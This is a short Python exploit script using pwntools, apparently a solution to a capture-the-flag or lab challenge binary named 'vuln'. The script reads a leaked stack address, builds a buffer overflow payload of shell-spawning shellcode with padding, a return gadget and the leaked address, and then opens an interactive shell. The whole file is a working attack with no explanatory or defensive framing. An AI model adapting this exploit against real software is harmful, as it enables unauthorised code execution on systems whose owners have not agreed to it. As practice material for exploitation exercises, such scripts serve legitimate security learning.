#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './vuln')

io = process('./vuln')
io.recvuntil(b"Addr: 0x")

leak = int(io.recvline().strip(), 16)
log.info(f"vuln buffer: {hex(leak)}")

shellcode = asm(shellcraft.sh())
payload  = b""
payload += shellcode
payload += b"0" * (0x58-len(shellcode))
payload += p64(0x40101a)
payload += p64(leak)

io.sendline(payload)
io.interactive()

